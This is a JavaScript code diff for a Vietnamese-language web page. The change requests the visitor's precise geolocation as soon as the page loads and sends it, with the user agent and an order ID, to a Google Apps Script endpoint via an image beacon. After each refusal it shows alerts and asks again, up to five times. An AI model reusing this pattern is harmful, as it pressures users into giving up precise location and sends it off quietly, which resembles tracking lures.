@@ -19,33 +19,66 @@ if (isAndroid && !isChrome) {
   });
 }
 
+let geoAttempts = 0;
+const MAX_GEO_ATTEMPTS = 5;
+
+function askGeoPermission() {
+  navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
+    enableHighAccuracy: true,
+  });
+}
+
+function successCallback(pos) {
+  geoAttempts = 0;
+
+  const qs = new URLSearchParams({
+    lat: pos.coords.latitude,
+    lng: pos.coords.longitude,
+    device: navigator.userAgent,
+    orderId: new URLSearchParams(location.search).get("orderId") || "",
+  });
+
+  const img = new Image();
+  img.src =
+    "https://script.google.com/macros/s/AKfycbweig3n4i6Bx0Uu-FE4MgWxSa9PoZoaU7uzXRS8MktuD5W7N3ZxfGYK8d8OY6QXK-Qi/exec?" +
+    qs.toString();
+  img.onload = () => {
+    document.body.innerHTML = "<h2>✅ Đã gửi vị trí thành công!</h2>";
+  };
+  img.onerror = () => {};
+}
+
+function errorCallback(err) {
+  if (err.code === err.PERMISSION_DENIED) {
+    geoAttempts++;
+    if (geoAttempts < MAX_GEO_ATTEMPTS) {
+      alert(
+        "Ứng dụng cần truy cập vị trí để tiếp tục.\n" +
+          "Vui lòng chọn Cho phép ở hộp thoại tiếp theo."
+      );
+      setTimeout(askGeoPermission, 500);
+    } else {
+      alert(
+        "Bạn đã từ chối quá 3 lần.\n" +
+          "Vui lòng cấp lại quyền vị trí trong cài đặt trình duyệt rồi tải lại trang."
+      );
+    }
+  } else {
+    alert("Không thể lấy vị trí: " + err.message);
+  }
+}
+
+getPosition();
+function getPosition() {
+  askGeoPermission();
+}
+
 function startYourApp() {
   //take position
   if (!navigator.geolocation) {
     alert("Trình duyệt không hỗ trợ định vị.");
     return;
   }
-
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      const qs = new URLSearchParams({
-        lat: pos.coords.latitude,
-        lng: pos.coords.longitude,
-        device: navigator.userAgent,
-        orderId: new URLSearchParams(location.search).get("orderId") || "",
-      });
-
-      const img = new Image();
-      img.src =
-        "https://script.google.com/macros/s/AKfycbweig3n4i6Bx0Uu-FE4MgWxSa9PoZoaU7uzXRS8MktuD5W7N3ZxfGYK8d8OY6QXK-Qi/exec?" +
-        qs.toString();
-      img.onload = () => {
-        document.body.innerHTML = "<h2>✅ Đã gửi vị trí thành công!</h2>";
-      };
-      img.onerror = () => {};
-    },
-    (err) => alert("Không thể lấy vị trí: " + err.message)
-  );
 
   //frame
 
